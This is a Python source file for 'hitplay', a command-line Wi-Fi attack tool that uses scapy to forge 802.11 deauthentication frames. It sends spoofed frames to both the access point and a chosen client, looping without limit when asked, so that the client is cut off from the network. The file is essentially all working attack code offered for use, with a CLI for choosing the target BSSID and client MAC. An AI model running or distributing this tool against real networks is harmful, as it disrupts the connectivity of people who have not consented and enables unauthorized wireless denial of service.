import argparse
import sys
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.l2 import ARP
from scapy.all import sendp, sr1

from helpers import check_root

# TODO: Auto-completions
# TODO: Add documentation + Usage + Logo
# TODO: Add arguments checking
# TODO: Needs deep testing


def get_mac_address(ip_address):
    """
    Gets the Mac address of an access point using its IP address
    """
    arp_request = ARP(pdst=ip_address)
    arp_replay = sr1(arp_request, verbose=False, timeout=1)
    if arp_replay is not None:
        return arp_replay.hwsrc
    else:
        return None


def deauth_attack(interface, bssid, client, count):
    """
    Performs the deauthentication attack.

    :param interface: The wireless interface to use.
    :param bssid: The MAC address of the access point.
    :param client: The MAC address of the client to deauthenticate.
    :param count: The number of deauthentication packets to send.
    """
    print(f"Starting deauthentication attack on {bssid} for client {client}")

    packet_to_client = (
        RadioTap()
        / Dot11(addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )

    packet_to_ap = (
        RadioTap()
        / Dot11(addr1=bssid, addr2=client, addr3=bssid)
        / Dot11Deauth(reason=7)
    )

    packets = [packet_to_ap, packet_to_client]
    print("Sending deauthentication packets... Press Ctrl+C to stop.")

    sent_count = 0
    loop_forever = count == 0
    try:
        while loop_forever or sent_count  < count:
            sendp(
                packets,
                iface=interface,
                verbose=False,
                count=1
            )
            sent_count += 1
            print(f"\rPackets sent: {sent_count}", end="")
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        print(f"\nTotal packets sent: {sent_count}")


def main():
    parser = argparse.ArgumentParser(
        prog="hitplay",
        description="A tool that does Deauth attacks on wireless devices",
        epilog="@By NS-Guys",
    )

    parser.add_argument(
        "interface",
        help="The network interface to use.",
    )
    parser.add_argument("-b", "--bssid", help="MAC address of the Access Point.")
    parser.add_argument("-c", "--client", help="MAC address of the client.")

    subparsers = parser.add_subparsers(dest="attack", help="Attack modes")
    deauth_parser = subparsers.add_parser(
        "deauth", help="Deauthentication attack: sends deauth packets to clients."
    )
    deauth_parser.add_argument(
        "count",
        type=int,
        help="Number of deauthentication packets to send (0 for unlimited).",
    )

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    check_root()

    print("Starting hitplay-ng...")
    print(f"Interface: {args.interface}")
    print(f"Attack Mode: {args.attack}")

    if args.bssid:
        print(f"Target BSSID: {args.bssid}")
    if args.client:
        print(f"Target Client: {args.client}")

    if args.attack == "deauth":
        print(f"Deauth Count: {args.count}")
        if not args.bssid or not args.client:
            print(
                "Deauthentication attack requires both --bssid (-b) and --client (-c)."
            )
            sys.exit(1)
        deauth_attack(args.interface, args.bssid, args.client, args.count)
    else:
        print("No valid attack specified !")


if __name__ == "__main__":
    main()
